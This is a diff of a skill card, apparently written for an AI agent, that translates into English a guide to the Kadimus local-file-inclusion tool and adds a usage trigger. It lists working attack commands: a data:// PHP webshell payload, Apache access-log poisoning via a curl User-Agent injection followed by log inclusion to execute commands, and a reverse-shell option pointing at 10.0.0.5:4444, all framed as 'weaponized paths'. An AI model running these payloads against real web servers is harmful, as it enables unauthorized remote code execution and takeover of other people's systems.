@@ -2,40 +2,43 @@
 name: kadimus-lfi-rce
 description: "Kadimus gains shells via log poisoning. Signals: web vulnerability, injection, LFI detection, log poisoning path, self-contained reverse shell."
 zh-signals: "Kadimus: 日志污染拿 shell。信号:web漏洞,注入,LFI 检测,日志污染路径,自包含反弹 shell。"
+when-to-use: >-
+  Use when a web parameter looks vulnerable to local file inclusion and you want
+  to detect LFI and weaponize it via log poisoning, data:// or self-contained reverse shell.
 ---
 
 # Kadimus
 
-- 攻击大类:C09 Web利用(LFI)
-- 上游仓库:https://github.com/P0cL4bs/Kadimus
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C09 Web Exploitation (LFI)
+- Upstream Repository: https://github.com/P0cL4bs/Kadimus
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/P0cL4bs/Kadimus && cd Kadimus && make
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./kadimus -u 'https://t.com/?page=about'` | LFI 检测 |
-| `-t -u url -D data:// -c '<?php system($_GET[0]);?>'` | data:// 封装+命令执行 |
-| `--lfi-log /var/log/apache2/access.log` | 日志污染路径 |
-| `-S 10.0.0.5:4444 -u url -D /proc/self/fd/` | 自包含反弹 shell |
-| `--cookie 'PHPSESSID=xxx'` | 带 Cookie 扫描 |
-| `-b` | base64 输出处理 |
+| `./kadimus -u 'https://t.com/?page=about'` | LFI detection |
+| `-t -u url -D data:// -c '<?php system($_GET[0]);?>'` | data:// wrapper + command execution |
+| `--lfi-log /var/log/apache2/access.log` | Log poisoning path |
+| `-S 10.0.0.5:4444 -u url -D /proc/self/fd/` | Self-contained reverse shell |
+| `--cookie 'PHPSESSID=xxx'` | Scan with a Cookie |
+| `-b` | base64 output handling |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 日志污染拿 shell
+### Log Poisoning to Get a Shell
 
 ```bash
 curl -A "<?php system(\$_GET['c']);?>" http://t.com/
 ./kadimus -u 'http://t.com/view.php?file=../../../../var/log/apache2/access.log&c=id' --cmd id
 ```
 
-## 注意事项
+## Notes
 
-LFI 专项: data://、/proc/self/environ、日志污染、php://input 四条武器化路径。
+LFI specialist: four weaponized paths — data://, /proc/self/environ, log poisoning, and php://input.
